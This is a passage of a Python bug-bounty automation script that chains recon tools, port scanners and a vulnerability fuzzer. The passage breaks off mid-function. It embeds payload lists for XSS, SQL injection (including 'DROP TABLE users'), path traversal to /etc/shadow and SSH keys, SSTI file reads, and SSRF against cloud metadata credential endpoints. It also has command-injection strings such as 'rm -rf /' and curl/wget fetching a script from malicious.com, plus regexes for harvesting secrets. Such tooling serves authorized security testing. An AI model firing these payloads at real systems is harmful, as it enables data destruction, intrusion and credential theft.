#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Bug Bounty Multi-Super-Tool Deluxe (bbdeluxe.py)

Highlights:
  • Subdomain pipeline: assetfinder/subfinder/chaos/amass → (dsieve) → shuffledns/massdns → dnsx
  • Probe & tech: httpx (+proxy), tlsx (SAN harvest + diff report)
  • URLs: gau/gauplus, katana, hakrawler, linkfinder (JS endpoints)
  • Ports: naabu → httpx scheme-fallback; optional nmap
  • Extras: favirecon (+mmh3 mapping), csprecon (+heuristic analysis), cariddi, cloakquest3r
  • Scanners: nuclei (jsonl, +interactions), dalfox, kxss
  • OOB: interactsh-client hookup
  • Fuzzer: categories (xss,lfi,sqli,domxss,ssti,ssrf,rce), per-host & per-scheme budgets, UA & proxy rotation,
            SQLite de-dupe cache, NDJSON output + per-category reports
  • Grep Intel: regex hunt across headers + bodies on juicy extensions → ndjson + summary
  • SSRF candidates: score likely SSRF parameters across gathered URLs/JS
  • External Intel APIs (opt-in via keys): Shodan, Censys, FOFA, VirusTotal, urlscan.io, BinaryEdge
  • Workdir layout helper: setup_folders(domain) → ~/work/bug_bountys/<domain>_bugbounty
  • Unified intel JSON + normalized JSON + optional NDJSON

Note: This tool orchestrates third-party binaries. Install what you need from their repos.
"""

import asyncio, os, re, sys, shutil, time, json, argparse, random, sqlite3, urllib.parse, subprocess, base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from typing import Iterable, List, Optional, Tuple, Dict, Set, Any
from urllib.parse import urlsplit, urlunsplit, urlencode, parse_qsl

# ------------------------ Pretty console ------------------------
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
    from rich import box
except ImportError:
    print("[-] Missing 'rich'. Install with: pip install rich", file=sys.stderr)
    sys.exit(1)

# ------------------------ HTTP client ------------------------
try:
    import requests
    try:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except Exception:
        pass
except Exception:
    requests = None

console = Console()

# -------------------------------------------------------------------------------------
# Victor's folder layout
# -------------------------------------------------------------------------------------
def setup_folders(domain):
    work_dir = os.path.expanduser("~/work/")
    bug_bounty_dir = os.path.join(work_dir, "bug_bountys")
    os.makedirs(bug_bounty_dir, exist_ok=True)
    os.chdir(bug_bounty_dir)
    domain_dir = os.path.join(bug_bounty_dir, f"{domain}_bugbounty")
    os.makedirs(domain_dir, exist_ok=True)
    os.chdir(domain_dir)
    for name in ["summary.txt", f"{domain}_subdomains.txt", f"{domain}_subdom_details.txt"]:
        Path(name).touch()
    return domain_dir

# -------------------------------------------------------------------------------------
# Utils
# -------------------------------------------------------------------------------------
def which(cmd: str) -> Optional[str]: return shutil.which(cmd)
def tool_exists(cmd: str) -> bool: return which(cmd) is not None
def valid_domain(domain: str) -> bool: return bool(re.match(r"^(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$", domain))
def ensure_dir(p: Path) -> Path: p.mkdir(parents=True, exist_ok=True); return p
def stamp() -> str: return datetime.now().strftime("%Y%m%d_%H%M%S")

async def run_cmd(cmd: str, input_lines: Optional[Iterable[str]] = None, cwd: Optional[Path] = None, timeout: Optional[int] = None) -> Tuple[int, List[str], str]:
    data = None
    if input_lines:
        data = ("\n".join([s.strip() for s in input_lines if s.strip()]) + "\n").encode()
    proc = await asyncio.create_subprocess_shell(
        cmd,
        stdin=asyncio.subprocess.PIPE if data else None,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        cwd=str(cwd) if cwd else None,
        env=os.environ.copy()
    )
    try:
        out, err = await asyncio.wait_for(proc.communicate(data), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill(); return -1, [], f"[timeout] {cmd}"
    return proc.returncode, out.decode(errors="replace").splitlines(), err.decode(errors="replace"])

def dedup_append(path: Path, lines: Iterable[str]) -> int:
    existing = set(read_lines(path))
    new = 0
    with path.open("a", encoding="utf-8") as f:
        for line in lines:
            s = line.strip()
            if s and s not in existing:
                f.write(s + "\n"); existing.add(s); new += 1
    return new

def write_lines(path: Path, lines: Iterable[str]) -> int:
    c = 0
    with path.open("w", encoding="utf-8") as f:
        for line in lines:
            s = line.strip()
            if s:
                f.write(s + "\n"); c += 1
    return c

def read_lines(path: Path) -> List[str]:
    if not path.exists(): return []
    with path.open("r", encoding="utf-8", errors="ignore") as f:
        return [l.strip() for l in f if l.strip()]

def uniq(lines: Iterable[str]) -> List[str]:
    out, seen = [], set()
    for l in lines:
        s = l.strip()
        if s and s not in seen: out.append(s); seen.add(s)
    return out

def filter_scope(subs: Iterable[str], domain: str) -> List[str]:
    d = domain.lower()
    return uniq([s for s in subs if s.lower()==d or s.lower().endswith("."+d)])

# -------------------------------------------------------------------------------------
# Payloads & helpers
# -------------------------------------------------------------------------------------
MAX_WORKERS = 20
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
]

xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "<iframe src='javascript:alert(1)'></iframe>",
"<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>", "<a href=javascript:alert(1)>Click</a>", "<div onmouseover=alert(1)>Hover</div>",
"</script><script>alert(1)</script>", "<video><source onerror=alert(1)>", "<img src='x' onerror='alert(1)'/>", "<script>confirm('XSS')</script>",
"<svg><desc>alert(1)</desc></svg>", "<link href='javascript:alert(1)'>", "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
"<math href=x onmouseover=alert(1)>", "<embed src=data:text/html,<script>alert(1)</script>>", "<object data=data:text/html,<script>alert(1)</script>>",
"<marquee onstart=alert(1)>", "<details ontoggle=alert(1)>", "<style>@keyframes x{}</style>", "<base href='javascript:alert(1)'>",
"<form><button formaction=javascript:alert(1)>Click</button></form>", "<iframe srcdoc='<script>alert(1)</script>'>",
"<img src=x:alert(1) onerror=eval(src)>", "<body><img src=1 onerror=alert(1)></body>"]

lfi_payloads = ["../../../../etc/passwd", "/../../../../etc/passwd", "../etc/passwd", "../../etc/shadow", "/var/log/nginx/access.log",
"/proc/self/environ", "../../boot.ini", "/../../../../../../../../../etc/passwd", "/etc/passwd%00", "/../../../../etc/hostname",
"/../../../../etc/motd", "/../../../../windows/system32/drivers/etc/hosts", "/../../../../../../../../../etc/shadow",
"../../../../../var/www/html/.env", "../../../../../proc/version", "../../../../../etc/issue", "../../../../../etc/group",
"../../../../../.bash_history", "../../../../../home/root/.ssh/authorized_keys", "/../../../../../../../../../../etc/passwd",
"/../../../../../../../../../../etc/shadow", "/../../../../../../../../../../proc/self/cmdline", "/../../../../../../../../../../etc/mtab",
"../../../../../etc/security/passwd", "../../../../../var/mail/root", "../../../../../root/.bash_profile", "../../../../../root/.profile"]

sqli_payloads = ["' OR 1=1 --", "' OR '1'='1", "admin'--", "' UNION SELECT NULL,NULL--", "' UNION ALL SELECT username, password FROM users--",
"' AND SLEEP(5)--", "'; DROP TABLE users;--", "' AND BENCHMARK(500000,MD5('test'))--", "'; EXEC xp_cmdshell('dir');--",
"' OR EXISTS(SELECT * FROM users WHERE username='admin')--", "' UNION SELECT 1,2,3 FROM information_schema.tables--",
"' UNION SELECT null, version()--", "' AND (SELECT COUNT(*) FROM users) > 0 --", "' OR 1=1#", "' OR 'a'='a'#",
"' UNION SELECT @@version, user()--", "' UNION SELECT NULL, NULL, NULL, NULL--", "' UNION SELECT database(), NULL, NULL--",
"' UNION SELECT schema_name FROM information_schema.schemata--", "' UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'--",
"' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97--", "' AND 1=2 UNION SELECT NULL,NULL,NULL--",
"' UNION SELECT CONCAT(username, ':', password) FROM users--", "' UNION SELECT password FROM admin WHERE username='admin'--"]

dom_xss_payloads = ["#<script>alert(1)</script>", "#<img src=x onerror=alert(1)>", "#<svg onload=alert(1)>", "#<a href=javascript:alert(1)>Click</a>",
"#<iframe src='javascript:alert(1)'></iframe>", "#<button onclick=alert(1)>Click</button>", "#javascript:alert(1)",
"#data:text/html,<script>alert(1)</script>", "#<div id=x onmouseover='alert(1)'>Hover</div>", "#?search=<script>alert(1)</script>",
"#<style>*{}</style><script>alert(1)</script>", "#<marquee onstart=alert(1)>", "#<audio src= onerror=alert(1)>", "#<video src= onerror=alert(1)>",
"#javascript://%0aalert(1)", "#<form><input onfocus=alert(1) autofocus></form>", "#<svg><desc>alert(1)</desc></svg>",
"#<object data=data:text/html,<script>alert(1)</script>>", "#<math href=x onmouseover=alert(1)>", "#<img src=x onerror=alert(1)>"]

ssti_payloads = ["{{7*7}}", "{{config['SECRET_KEY']}}", "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
"{{request.application.__globals__.__builtins__.open('/etc/passwd').read() }}", "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/shadow').read() }}",
"{{loop.controls}}{{config}}", "{{request['application']['__globals__']['__builtins__']['open']('/etc/passwd').read()}}",
"{{7*'7'}}", "{{request['application'].__globals__.__builtins__.open('/etc/shadow').read()}}", "{{self.__init__.__globals__.__builtins__.open('/etc/passwd').read()}}",
"{{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}", "{{''.join(chr(c) for c in [104,101,108,108,111])}}",
"{{''.__class__.mro()[2].__subclasses__()[59]('/etc/passwd').read()}}", "{{request['application']['__globals__']['__builtins__']['open']('/etc/issue').read()}}",
"{{''.join([str(x) for x in range(10)])}}", "{{4*4}}", "{{config['SESSION_COOKIE_NAME']}}", "{{config.items()}}",
"{{request application __globals__ __builtins__ help('modules')}}", "{{dict.__class__.__mro__[1].__subclasses__()}}"]

ssrf_payloads = ["http://169.254.169.254/", "http://127.0.0.1/", "http://localhost/", "http://metadata.google.internal/computeMetadata/v1/",
"http://[::1]/", "http://0.0.0.0/", "http://169.254.169.254/latest/meta-data/", "http://example.com@127.0.0.1/",
"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "http://localhost:8000/", "http://127.0.0.1:8080/",
"http://[::ffff:127.0.0.1]/", "http://example.com@localhost/", "http://10.0.0.1/", "http://10.0.0.2/",
"http://172.16.0.1/", "http://192.168.1.1/", "http://192.168.0.1/", "http://127.0.1.1/", "http://metadata.google.internal/computeMetadata/v1/project/"]

rce_payloads = ["`id`", "id", "$(id)", "$(whoami)", "`whoami`", "|id", "|whoami", "`uname -a`", "$(uname -a)", "$(ls -al)", "`ls -al`",
";id", "||id", "&id", "`cat /etc/passwd`", "$(cat /etc/passwd)", "`cat /etc/shadow`", "$(cat /etc/shadow)", "`whoami`",
"`rm -rf /`", "`touch /tmp/vuln`", "`echo Hello`", "$(echo Exploit)", "$(rm /tmp/file)", "`cp /etc/passwd /tmp/`", "`ping -c 1 8.8.8.8`",
"`wget http://malicious.com/script.sh`", "`curl http://malicious.com/script.sh`"]

# Extra patterns for grep-intel (cloud & secrets)
PATTERNS = [
    ("ip.private", r"\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[0-1])\.\d{1,3}\.\d{1,3})\b"),
    ("ipv6.ula", r"\b(?:fc00|fd[0-9a-f]{2}):[0-9a-f:]{2,}\b"),
    ("aws.access_key_id", r"\bAKIA[0-9A-Z]{16}\b"),
    ("aws.secret_access_key", r"(?i)aws[_-]?secret[_-]?access[_-]?key[\"'\s:=]{0,12}([A-Za-z0-9/+=]{32,})"),
    ("aws.bucket.s3", r"\b(?:s3://|s3\.amazonaws\.com/|([a-z0-9.-]{3,63})\.s3\.amazonaws\.com)\b"),
    ("gcp.api_key", r"\bAIza[0-9A-Za-z\-_]{35}\b"),
    ("gcp.bucket", r"\bgs://[a-z0-9][a-z0-9._-]{2,}\b"),
    ("azure.connection", r"\b(DefaultEndpointsProtocol=https;AccountName=[a-z0-9]{3,24};AccountKey=[A-Za-z0-9+/=]{50,})"),
    ("azure.blob", r"\bhttps?://[a-z0-9]{3,24}\.blob\.core\.windows\.net/[^\s\"'<>]+"),
    ("do.spaces", r"\bhttps?://[a-z0-9.-]+\.digitaloceanspaces\.com/[^\s\"'<>]+"),
    ("slack.token", r"\bxox[abpr]-[0-9A-Za-z-]{10,}\b"),
    ("github.token", r"\bghp_[A-Za-z0-9]{36}\b"),
    ("jwt", r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b"),
    ("privkey", r"-----BEGIN (?:RSA|EC|DSA|OPENSSH|PGP|PRIVATE) KEY-----"),
    ("db.uri", r"\b(?:postgres|mysql|mongodb|redis)://[^\s\"'<>]+"),
    ("api.generic", r"\b(?:(?:api_?key|secret|token|auth|authorization|bearer)[\"'\s:=]{1,10}[A-Za-z0-9_\-]{8,})"),
    ("k8s.env", r"\bKUBERNETES[_A-Z0-9]*\b"),
    ("docker.env", r"\bDOCKER[_A-Z0-9]*\b"),
]

GREP_EXTS = {".js",".css",".php",".env",".bak",".conf",".config",".ini",".cfg",".yaml",".yml",".json",".txt",".properties"}

def encode_times(s: str, times: int) -> str:
    out = s
    for _ in range(max(0, times)):
        out = urllib.parse.quote(out, safe="")
    return out

def inject_query(url: str, payload: str) -> str:
    try:
        u = urllib.parse.urlsplit(url)
        q = urllib.parse.parse_qsl(u.query, keep_blank_values=True)
        if not q:
            q = [("q", payload)]
        else:
            q = [(k, payload) for (k, _v) in q]
        return urllib.parse.urlunsplit((u.scheme, u.netloc, u.path, urllib.parse.urlencode(q, doseq=True), u.fragment))
    except Exception:
        return url

# -------------------------------------------------------------------------------------
# Stages
# -------------------------------------------------------------------------------------
async def stage_subdomains(domain: str, out_file: Path) -> Dict[str, int]:
    cmds = []
    if tool_exists("assetfinder"): cmds.append(f"assetfinder -subs-only {domain} || true")
    if tool_exists("subfinder"):   cmds.append(f"subfinder -silent -all -d {domain} || true")
    if tool_exists("chaos"):       cmds.append(f"chaos -silent -d {domain} {('-key ' + os.getenv('CHAOS_KEY')) if os.getenv('CHAOS_KEY') else ''} || true")
    if tool_exists("amass"):       cmds.append(f"amass enum -passive -norecursive -noalts -d {domain} || true")
    if not cmds: return {"tools": 0, "lines": 0}
    async def run_and_collect(cmd):
        rc, out, err = await run_cmd(cmd, timeout=300)
        if err.strip(): console.log(f"[yellow]subdomains stderr[/]: {cmd}\n{err.strip()}")
        return out
    results = await asyncio.gather(*[run_and_collect(c) for c in cmds])
    merged = [l.strip() for chunk in results for l in chunk if l.strip()]
    in_scope = filter_scope(merged, domain)
    new_count = dedup_append(out_file, in_scope)
    return {"tools": len(cmds), "lines": new_count}

async def stage_dsieve(in_file: Path, out_file: Path) -> int:
    if not tool_exists("dsieve"): return 0
    rc, out, err = await run_cmd(f"dsieve -f {in_file}", timeout=180)
    if err.strip(): console.log(f"[yellow]dsieve stderr[/]\n{err.strip()}")
    return write_lines(out_file, out)

async def stage_shuffledns(domain: str, subs_file: Path, resolvers: Optional[Path], out_file: Path) -> int:
    if not tool_exists("shuffledns"): return 0
    cmd = f"shuffledns -d {domain} -list {subs_file} -silent"
    if resolvers and resolvers.exists(): cmd += f" -r {resolvers}"
    rc, out, err = await run_cmd(cmd, timeout=1800)
    if err.strip(): console.log(f"[yellow]shuffledns stderr[/]\n{err.strip()}")
    n = write_lines(out_file, out)
    console.log(f"[green]shuffledns[/] resolved {n}")
    return n

async def stage_massdns(subs_file: Path, resolvers: Optional[Path], out_file: Path) -> int:
    if not tool_exists("massdns") or not resolvers or not resolvers.exists(): return 0
    tmp_out = out_file.with_suffix(".raw")
    cmd = f"massdns -r {resolvers} -t A -o S -w {tmp_out} {subs_file}"
    rc, out, err = await run_cmd(cmd, timeout=1800)
    if err.strip(): console.log(f"[yellow]massdns stderr[/]\n{err.strip()}")
    lines = []
    for line in read_lines(tmp_out):
        parts = line.split()
        if len(parts) >= 3 and parts[1] in ("A", "AAAA"):
            host = parts[0].rstrip("."); lines.append(host)
    n = write_lines(out_file, lines)
    try: tmp_out.unlink()
    except Exception: pass
    console.log(f"[green]massdns[/] resolved {n}")
    return n

async def stage_dnsx(subs_file: Path, dns_file: Path) -> Dict[str, int]:
    subs = read_lines(subs_file)
    if not subs or not tool_exists("dnsx"): return {"lines": 0}
    cmd = f"dnsx -silent -a -resp-only -json -l {subs_file}"
    rc, out, err = await run_cmd(cmd, timeout=900)
    if err.strip(): console.log(f"[yellow]dnsx stderr[/]\n{err.strip()}")
    n = write_lines(dns_file, out)
    console.log(f"[green]dnsx[/] {n} JSON lines")
    return {"lines": n}

async def stage_probe_httpx(subs_file: Path, alive_file: Path, httpx_json_file: Path, extra_urls: list = None, proxy: str = "") -> Dict[str, int]:
    subs = read_lines(subs_file); extra_urls = extra_urls or []
    if not subs and not extra_urls: return {"roots": 0, "json": 0}
    if tool_exists("httpx"):
        flags = "-json -tech-detect -title -status-code -web-server -cdn -ip -content-length -silent -follow-redirects"
        if proxy: flags += f" -proxy {proxy}"
        rc, out, err = await run_cmd(f"httpx {flags}", input_lines=(subs + extra_urls), timeout=1200)
        if err.strip(): console.log(f"[yellow]httpx stderr[/]\n{err.strip()}")
        n_json = write_lines(httpx_json_file, out)
        roots = []
        for line in out:
            try:
                j = json.loads(line)
                if "url" in j: roots.append(j["url"])
            except Exception: pass
        n_roots = dedup_append(alive_file, roots)
        console.log(f"[green]httpx[/] roots +{n_roots}, json {n_json}")
        return {"roots": n_roots, "json": n_json}
    elif tool_exists("httprobe"):
        rc, out, err = await run_cmd("httprobe", input_lines=(subs + extra_urls), timeout=900)
        if err.strip(): console.log(f"[yellow]httprobe stderr[/]\n{err.strip()}")
        n_roots = dedup_append(alive_file, out); return {"roots": n_roots, "json": 0}
    return {"roots": 0, "json": 0}

async def stage_tlsx(hosts_file: Path, out_file: Path, new_subs_file: Path, pre_subs: Set[str]) -> Dict[str, int]:
    if not tool_exists("tlsx"): return {"lines": 0, "new_subs": 0, "diff": 0}
    hosts = read_lines(hosts_file)
    if not hosts: return {"lines": 0, "new_subs": 0, "diff": 0}
    rc, out, err = await run_cmd(f"tlsx -silent -l {hosts_file} -json", timeout=1800)
    if err.strip(): console.log(f"[yellow]tlsx stderr[/]\n{err.strip()}")
    n = write_lines(out_file, out)
    # harvest SAN/DNS names
    new_subs = set()
    for line in out:
        try:
            j = json.loads(line)
            for k in ("dns_names", "subject_dns_names", "san_dns_names"):
                vals = j.get(k, [])
                if isinstance(vals, list):
                    for v in vals:
                        if isinstance(v, str): new_subs.add(v.strip(".").lower())
        except Exception: pass
    ns = dedup_append(new_subs_file, sorted(new_subs))
    # diff report
    diff = sorted([s for s in new_subs if s not in pre_subs])
    (new_subs_file.with_name("tlsx_newsubs_diff.txt")).write_text("\n".join(diff))
    console.log(f"[green]tlsx[/] wrote {n} lines; new subs +{ns}; diff {len(diff)}")
    return {"lines": n, "new_subs": ns, "diff": len(diff)}

async def stage_urls(domain: str, subs_file: Path, urls_file: Path) -> Dict[str, int]:
    counts = {"tools": 0, "lines": 0}
    if tool_exists("gauplus"):
        rc, out, err = await run_cmd(f"gauplus -d {domain} -random-agent -b png,jpg,jpeg,gif,svg,woff,woff2,ttf,ico", timeout=600)
        if err.strip(): console.log(f"[yellow]gauplus stderr[/]\n{err.strip()}")
        n = dedup_append(urls_file, out); counts["lines"] += n; counts["tools"] += 1; console.log(f"[green]gauplus[/] +{n}")
    elif tool_exists("gau"):
        rc, out, err = await run_cmd(f"echo {domain} | gau --providers wayback,otx,commoncrawl,virustotal", timeout=600)
        if err.strip(): console.log(f"[yellow]gau stderr[/]\n{err.strip()}")
        n = dedup_append(urls_file, out); counts["lines"] += n; counts["tools"] += 1; console.log(f"[green]gau[/] +{n}")
    if tool_exists("katana"):
        cmd = f"katana -silent -list {subs_file} -jc -jsl -xhr -retry 2 -d 3 -hl -kf all" if subs_file.exists() else f"katana -silent -u https://{domain} -jc -jsl -xhr -retry 2 -d 3 -hl -kf all"
        rc, out, err = await run_cmd(cmd, timeout=900)
        if err.strip(): console.log(f"[yellow]katana stderr[/]\n{err.strip()}")
        n = dedup_append(urls_file, out); counts["lines"] += n; counts["tools"] += 1; console.log(f"[green]katana[/] +{n}")
    return counts

def is_js_url(u: str) -> bool: return re.search(r"\.js(\?.*)?$", u.split("#",1)[0], re.I) is not None

async def stage_hakrawler(alive_roots_file: Path, urls_file: Path) -> int:
    roots = read_lines(alive_roots_file)
    if not roots or not tool_exists("hakrawler"): return 0
    rc, out, err = await run_cmd("hakrawler -d 3 -subs -insecure -plain", input_lines=roots, timeout=900)
    if err.strip(): console.log(f"[yellow]hakrawler stderr[/]\n{err.strip()}")
    n = dedup_append(urls_file, out); console.log(f"[green]hakrawler[/] +{n}"); return n

async def stage_linkfinder(urls_file: Path, js_file: Path) -> int:
    all_u = read_lines(urls_file); js_urls = [u for u in all_u if is_js_url(u)]
    if not js_urls or not tool_exists("linkfinder"): return 0
    found = []
    progress = Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TimeElapsedColumn(), console=console)
    with progress:
        task = progress.add_task("linkfinder(js)", total=len(js_urls))
        for ju in js_urls:
            rc, out, err = await run_cmd(f"linkfinder -i {ju} -o cli", timeout=120)
            for line in out:
                s = line.strip()
                if s.startswith("http"): found.append(s)
            progress.advance(task)
    n = dedup_append(js_file, found); console.log(f"[green]linkfinder[/] +{n}"); return n

async def stage_naabu(subs_file: Path, naabu_json_file: Path) -> Dict[str, int]:
    subs = read_lines(subs_file)
    if not subs or not tool_exists("naabu"): return {"lines": 0}
    rc, out, err = await run_cmd("naabu -silent -json -verify", input_lines=subs, timeout=2400)
    if err.strip(): console.log(f"[yellow]naabu stderr[/]\n{err.strip()}")
    n = write_lines(naabu_json_file, out); console.log(f"[green]naabu[/] {n} JSON"); return {"lines": n}

def flip_urls_scheme(urls: List[str]) -> List[str]:
    out = []
    for u in urls:
        if u.startswith("http://"):  out.append("https://" + u[7:])
        elif u.startswith("https://"): out.append("http://" + u[8:])
    return out

def build_urls_from_naabu(naabu_json_file: Path) -> list:
    urls = []
    if not naabu_json_file.exists(): return urls
    def mk(host, port, scheme):
        if (scheme=="http" and port==80) or (scheme=="https" and port==443): return f"{scheme}://{host}"
        return f"{scheme}://{host}:{port}"
    with naabu_json_file.open() as f:
        for line in f:
            try: j = json.loads(line)
            except Exception: continue
            host = j.get("host") or j.get("ip")
            port = int(j.get("port", 0)) if j.get("port") is not None else 0
            service = (j.get("service") or "").lower()
            if not host or not port: continue
            if "https" in service: urls.append(mk(host, port, "https"))
            elif "http" in service: urls.append(mk(host, port, "http"))
            elif port in (443, 8443): urls.append(mk(host, port, "https"))
            elif port in (80, 8080, 8000, 8888, 9000): urls.append(mk(host, port, "http"))
            else: urls += [mk(host, port, "http"), mk(host, port, "https")]
    out, seen = [], set()
    for u in urls:
        if u not in seen: out.append(u); seen.add(u)
    return out

async def stage_nmap_from_naabu(naabu_json_file: Path, nmap_dir: Path, max_hosts: int = 64) -> Dict[str, int]:
    ensure_dir(nmap_dir)
    if not naabu_json_file.exists() or not tool_exists("nmap"): return {"hosts": 0}
    ports_per_host = {}
    with naabu_json_file.open() as f:
        for line in f:
            try:
                j = json.loads(line); host = j.get("host") or j.get("ip"); port = int(j.get("port", 0))
                if host and port: ports_per_host.setdefault(host, set()).add(port)
            except Exception: continue
    count = 0
    for host, ports in list(ports_per_host.items())[:max_hosts]:
        outp = nmap_dir / f"{host.replace(':','_')}.txt"
        cmd = f"nmap -Pn -sV -sC -T4 -p {','.join(str(p) for p in sorted(ports))} {host} -oN {outp}"
        rc, out, err = await run_cmd(cmd, timeout=2400)
        if err.strip(): console.log(f"[yellow]nmap stderr ({host})[/]\n{err.strip()}")
        count += 1
    console.log(f"[green]nmap[/] scanned {count}"); return {"hosts": count}

async def stage_ffuf(alive_roots_file: Path, ffuf_dir: Path, wordlist: str, max_roots: int = 50) -> int:
    if not tool_exists("ffuf"): console.log("[yellow]ffuf not installed; skipping.[/]"); return 0
    ensure_dir(ffuf_dir); roots = read_lines(alive_roots_file)[:max_roots]; total = 0
    for root in roots:
        base = root.rstrip("/") + "/"; target = base + "FUZZ"
        out_file = ffuf_dir / (base.replace("://","_").replace("/","_") + ".json")
        cmd = f'ffuf -u "{target}" -w "{wordlist}" -mc 200,204,301,302,307,401,403 -fs 0 -of json -o "{out_file}" -t 50 -recursion -recursion-depth 1'
        rc, out, err = await run_cmd(cmd, timeout=3600)
        if err.strip(): console.log(f"[yellow]ffuf stderr ({base})[/]\n{err.strip()}")
        try: data = json.loads(out_file.read_text()); hits = len(data.get("results", []))
        except Exception: hits = 0
        total += hits
    console.log(f"[green]ffuf[/] total hits {total}"); return total

async def stage_cariddi(alive_roots_file: Path, out_file: Path) -> int:
    if not tool_exists("cariddi"): return 0
    roots = read_lines(alive_roots_file)
    if not roots: return 0
    rc, out, err = await run_cmd("cariddi -silent", input_lines=roots, timeout=1800)
    if err.strip(): console.log(f"[yellow]cariddi stderr[/]\n{err.strip()}")
    n = write_lines(out_file, out); console.log(f"[green]cariddi[/] {n}"); return n

async def stage_cloakquest3r(alive_roots_file: Path, out_file: Path) -> int:
    tool = which("cloakquest3r")
    if not tool: return 0
    roots = read_lines(alive_roots_file)
    if not roots: return 0
    rc, out, err = await run_cmd(f"{tool}", input_lines=roots, timeout=1800)
    if err.strip(): console.log(f"[yellow]cloakquest3r stderr[/]\n{err.strip()}")
    n = write_lines(out_file, out); console.log(f"[green]cloakquest3r[/] {n}"); return n

async def stage_interactsh(poll_seconds: int, out_file: Path) -> Dict[str, str]:
    if not tool_exists("interactsh-client"): console.log("[yellow]interactsh-client not found; skipping.[/]"); return {}
    proc = await asyncio.create_subprocess_shell(f"interactsh-client -json -o {out_file}", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    oob_domain = ""
    try:
        for _ in range(5):
            try: line = await asyncio.wait_for(proc.stdout.readline(), timeout=1.5)
            except asyncio.TimeoutError: break
            s = line.decode(errors="ignore").strip()
            m = re.search(r"([a-z0-9\-]+\.oast\.[a-z\.]+)", s)
            if m: oob_domain = m.group(1); break
    except Exception: pass
    console.log(f"[green]interactsh[/] polling {poll_seconds}s → {out_file.name}" + (f" (oob: {oob_domain})" if oob_domain else ""))
    await asyncio.sleep(poll_seconds)
    try: proc.kill()
    except Exception: pass
    return {"oob_domain": oob_domain} if oob_domain else {}

def shodan_lookup_ips(ips: List[str], out_file: Path, api_key: Optional[str]) -> int:
    if not api_key or requests is None: return 0
    base = "https://api.shodan.io/shodan/host/{}?key={}"; found = 0
    with out_file.open("w", encoding="utf-8") as f:
        for ip in sorted(set(ips)):
            try:
                r = requests.get(base.format(ip, api_key), timeout=20)
                if r.status_code == 200: f.write(json.dumps(r.json()) + "\n"); found += 1
                else: f.write(json.dumps({"ip": ip, "status": r.status_code}) + "\n")
            except Exception as e: f.write(json.dumps({"ip": ip, "error": str(e)}) + "\n")
    console.log(f"[green]shodan[/] {found}"); return found

# -------------------- Recon extras --------------------
async def stage_favirecon(alive_roots_file: Path, out_file: Path) -> int:
    if not tool_exists("favirecon"): return 0
    roots = read_lines(alive_roots_file)
    if not roots: return 0
    rc, out, err = await run_cmd(f"favirecon -l {alive_roots_file}", timeout=1800)
    if err.strip(): console.log(f"[yellow]favirecon stderr[/]\n{err.strip()}")
    n = write_lines(out_file, out); console.log(f"[green]favirecon[/] {n}"); return n

def map_favicon_hashes(fav_file: Path, map_json: Optional[Path], out_file: Path) -> int:
    """Map mmh3 hashes to tech names using a local JSON { "hash": ["Name1", "Name2"] }"""
    if not fav_file.exists() or not map_json or not map_json.exists(): return 0
    import json as _json
    pattern = re.compile(r"(-?\d{5,10})")
    hits = []
    try:
        mapping = _json.loads(map_json.read_text())
    except Exception:
        mapping = {}
    for line in read_lines(fav_file):
        m = pattern.search(line)
        if not m: continue
        h = m.group(1)
        names = mapping.get(h) or mapping.get(int(h), [])
        if names:
            hits.append({"hash": h, "names": names, "raw": line})
    if hits:
        out_file.write_text(_json.dumps(hits, indent=2))
    return len(hits)

async def stage_csprecon(alive_roots_file: Path, out_file: Path) -> int:
    if not tool_exists("csprecon"): return 0
    roots = read_lines(alive_roots_file)
    if not roots: return 0
    rc, out, err = await run_cmd(f"csprecon -l {alive_roots_file}", timeout=1800)
    if err.strip(): console.log(f"[yellow]csprecon stderr[/]\n{err.strip()}")
    n = write_lines(out_file, out); console.log(f"[green]csprecon[/] {n}"); return n

def analyze_csp_file(csp_file: Path, out_file: Path) -> None:
    """Heuristic CSP analysis for DOM sinks & bypass hints"""
    if not csp_file.exists(): return
    issues = []
    for line in read_lines(csp_file):
        policy = line
        if "script-src" in policy and "'unsafe-inline'" in policy:
            issues.append({"type":"csp", "issue":"script-src allows unsafe-inline", "raw": policy})
        if "object-src" not in policy or "object-src 'none'" not in policy:
            issues.append({"type":"csp", "issue":"object-src not restricted", "raw": policy})
        if "script-src" in policy and "*" in policy:
            issues.append({"type":"csp", "issue":"wildcard in script-src", "raw": policy})
        if "strict-dynamic" not in policy and "nonce-" not in policy and "hash-" not in policy:
